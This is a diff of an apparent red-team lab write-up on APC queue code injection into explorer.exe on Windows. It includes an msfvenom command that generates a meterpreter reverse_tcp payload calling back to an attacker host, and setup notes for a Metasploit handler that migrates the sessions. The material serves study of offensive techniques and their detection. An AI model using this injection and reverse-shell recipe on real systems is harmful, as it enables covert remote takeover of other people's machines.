@@ -2,12 +2,12 @@
 
 This lab looks at the APC \(Asynchronous Procedure Calls\) queue code injection technique.
 
-Some context around threads and APCs:
+Some context around threads and APCs and APC queues:
 
 * Threads execute code within processes
 * Threads can execute code asynchronously by leveraging APC queues
 * Each thread has a queue that stores all the APCs
-* Application can queue an APC to a given thread
+* Application can queue an APC to a given thread \(subject to rights\)
 * When a thread is scheduled, any queued APCs will be executed
 * Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code - the thread to which an APC was queued to, needs to enter/be in an [alertable](apc-queue-code-injection.md#alertable-state) state \(i.e [`SleepEx`](https://msdn.microsoft.com/en-us/library/ms686307%28v=VS.85%29.aspx)\)
 
@@ -21,7 +21,8 @@ A high level overview of how this lab works:
   * Write shellcode to that memory location
   * Find all threads in explorer.exe
   * Queue an APC to all those threads. APC points to the shellcode
-* When threads get scheduled, the shellcode gets executed
+* Execute the above program
+* When threads in explorer.exe get scheduled, our shellcode gets executed
 * Rain of meterpreter shells
 
 Let's start by creating a meterpreter shellcode to be injected into the victim process:
@@ -36,21 +37,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 
 ![](../../.gitbook/assets/annotation-2019-05-26-111814.png)
 
-I will be injecting the shellcode into `explorer.exe` since there's usually a lot of thread activity going on, so there is a better chance that at least one thread will execute the injected shellcode. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:
+I will be injecting the shellcode into `explorer.exe` since there's usually a lot of thread activity going on, so there is a better chance to encounter a thread in an alertable state that will kick off the shellcode. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:
 
-```cpp
-	if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
-		}
-	}
-```
+![](../../.gitbook/assets/annotation-2019-05-26-152927.png)
 
-Once explorer PID is found and memory is allocated in explorer.exe, the shellcode is written to explorer's process memory. Additionally, an APC routine, which now points to the shellcode, is declared:
+Once explorer PID is found, we need to get a handle to the process and allocate memory for the shellcode. The shellcode is then written to explorer's process memory and additionally, an APC routine, which now points to the shellcode, is declared:
 
 ![](../../.gitbook/assets/annotation-2019-05-26-151203.png)
 
-We can indeed see the shellcode got injected in the process successully:
+If we compile and execute the binary now, we can indeed see the shellcode gets injected into the process successully:
 
 ![](../../.gitbook/assets/annotation-2019-05-26-133126.png)
 
@@ -60,9 +55,9 @@ A quick detour - the below shows a screenshot from the Process Hacker where our 
 
 Back to the code - we can now enumerate all threads of explorer.exe and queue an APC to them:
 
-![sleep for some throttling](../../.gitbook/assets/annotation-2019-05-26-151757.png)
+![sleep for some throttling](../../.gitbook/assets/annotation-2019-05-26-151757%20%281%29.png)
 
-Switching gear to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with dying threads:
+Switching gears to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with the dying threads:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -73,7 +68,7 @@ set autorunscript post/windows/manage/migrate
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Once the `apcqueue` is compiled and run,  a meterpreter session is received:
+Once the `apcqueue` is compiled and run,  a meterpreter session is received - the technique worked:
 
 ![](../../.gitbook/assets/annotation-2019-05-26-134126.png)
 
@@ -102,7 +97,7 @@ Since `alertable.exe` was in an alertable state, the code got executed immediate
 
 ### Non-Alertable State
 
-Now let's recompile `alertable.exe` with `bAlertable == false` and try again - you will notice that the shellcode does not get executed regardless of how hard I try:
+Now let's recompile `alertable.exe` with `bAlertable == false` and try again - you will notice that the shellcode does not get executed:
 
 ![](../../.gitbook/assets/apcqueueinjection-nonalertable.gif)
 
